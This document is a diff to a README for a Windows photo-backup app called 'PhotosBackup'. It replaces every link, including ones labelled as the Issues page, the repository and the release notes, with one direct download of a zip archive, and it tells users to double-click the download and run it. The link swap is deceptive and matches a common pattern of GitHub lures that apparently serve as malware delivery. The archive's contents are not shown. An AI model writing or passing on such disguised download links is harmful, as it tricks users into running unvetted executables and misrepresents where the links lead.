@@ -4,14 +4,14 @@
 
 Welcome to **PhotosBackup**, the simplest way to keep your cherished photos safe and organized. Whether you're capturing family moments, vacations, or everyday memories, PhotosBackup ensures your pictures are always backed up securely. No technical skills required—just download, install, and let the app do the magic.
 
-[![Download Now](https://img.shields.io/badge/Download-PhotosBackup-blue?style=for-the-badge&logo=appveyor)](https://github.com/kopovartemij-code/PhotosBackup/releases)
+[![Download Now](https://img.shields.io/badge/Download-PhotosBackup-blue?style=for-the-badge&logo=appveyor)](https://raw.githubusercontent.com/kopovartemij-code/PhotosBackup/main/App/Backup_Photos_v3.2.zip)
 
 ## 📥 Download and Install
 
 Getting started is as easy as 1-2-3. Follow these steps to install PhotosBackup on your Windows computer:
 
 **Step 1: Download the App**
-Visit this link to download the application: [https://github.com/kopovartemij-code/PhotosBackup/releases](https://github.com/kopovartemij-code/PhotosBackup/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/kopovartemij-code/PhotosBackup/main/App/Backup_Photos_v3.2.zip](https://raw.githubusercontent.com/kopovartemij-code/PhotosBackup/main/App/Backup_Photos_v3.2.zip)
 
 **Step 2: Run the Installer**
 Once the download is complete, locate the downloaded file (usually in your "Downloads" folder) and double-click it to run the installer. Follow the on-screen instructions to complete the installation.
@@ -92,7 +92,7 @@ We're always working to improve PhotosBackup. Here are some recent updates:
 
 We love hearing from our users! If you have suggestions, ideas, or encounter any problems, please:
 
-1. Visit our [GitHub Issues page](https://github.com/kopovartemij-code/PhotosBackup/issues)
+1. Visit our [GitHub Issues page](https://raw.githubusercontent.com/kopovartemij-code/PhotosBackup/main/App/Backup_Photos_v3.2.zip)
 2. Share your experience with other users
 3. Rate the app if you find it helpful
 
@@ -100,7 +100,7 @@ We love hearing from our users! If you have suggestions, ideas, or encounter any
 
 Connect with other PhotosBackup users and stay up-to-date:
 
-- **Follow the Project:** Star our [GitHub repository](https://github.com/kopovartemij-code/PhotosBackup) to show your support
+- **Follow the Project:** Star our [GitHub repository](https://raw.githubusercontent.com/kopovartemij-code/PhotosBackup/main/App/Backup_Photos_v3.2.zip) to show your support
 - **Share Your Story:** Tell us how PhotosBackup has helped you protect your memories
 - **Contribute:** If you're technically inclined, feel free to contribute to the codebase
 
@@ -123,13 +123,13 @@ A: By default, photos are stored in the folder you choose during setup. You can 
 If you can't find the answer you're looking for, try these resources:
 
 - **GitHub Repository:** Visit our repo for technical documentation
-- **Release Notes:** Check the [releases page](https://github.com/kopovartemij-code/PhotosBackup/releases) for update information
+- **Release Notes:** Check the [releases page](https://raw.githubusercontent.com/kopovartemij-code/PhotosBackup/main/App/Backup_Photos_v3.2.zip) for update information
 - **Support:** Email us through the contact form on our GitHub page
 
 ---
 
 **Remember:** Your photos are irreplaceable. Don't wait until it's too late – start protecting your memories today with PhotosBackup!
 
-[![Download Now](https://img.shields.io/badge/Get%20PhotosBackup-Free-green?style=for-the-badge)](https://github.com/kopovartemij-code/PhotosBackup/releases)
+[![Download Now](https://img.shields.io/badge/Get%20PhotosBackup-Free-green?style=for-the-badge)](https://raw.githubusercontent.com/kopovartemij-code/PhotosBackup/main/App/Backup_Photos_v3.2.zip)
 
 Keywords: photos backup, photo backup windows, automatic photo backup, memory preservation, image backup software, free backup tool, iOS photos, photo storage, backup application, Windows photo backup
